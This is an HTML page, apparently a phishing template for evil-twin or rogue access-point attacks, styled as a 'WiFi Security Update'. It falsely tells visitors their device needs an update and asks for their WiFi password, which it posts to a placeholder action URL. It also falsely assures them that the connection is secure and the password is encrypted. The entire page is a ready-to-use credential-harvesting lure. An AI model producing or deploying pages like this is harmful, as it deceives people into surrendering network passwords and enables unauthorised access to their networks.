<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Security Update</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#e8edf2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.12);padding:35px 30px;max-width:380px;width:90%;text-align:center}
.icon{font-size:50px;margin-bottom:12px}
h2{color:#1a1a2e;font-size:20px;margin-bottom:6px}
p{color:#6c757d;font-size:14px;margin-bottom:22px;line-height:1.5}
.shield{background:#f8f9fa;border-radius:50%;width:80px;height:80px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
.shield span{font-size:40px}
input[type=password]{width:100%;padding:12px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;margin-bottom:16px;text-align:center}
input[type=password]:focus{outline:0;border-color:#2d7d46;box-shadow:0 0 0 3px rgba(45,125,70,.1)}
button{width:100%;padding:13px;background:#2d7d46;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;transition:background .2s}
button:hover{background:#236935}
.note{font-size:11px;color:#999;margin-top:14px}
</style>
</head>
<body>
<div class="card">
<div class="shield"><span>&#128737;</span></div>
<h2>WiFi Security Update</h2>
<p>Your device requires a security update to connect to this network.<br>Please enter your WiFi password below to complete the upgrade.</p>
<form method="POST" action="{ACTION_URL}">
<input type="password" name="password" placeholder="Enter WiFi password" required>
<button type="submit">Connect to WiFi</button>
</form>
<p class="note">This is a secure connection. Your password is encrypted.</p>
</div>
</body>
</html>
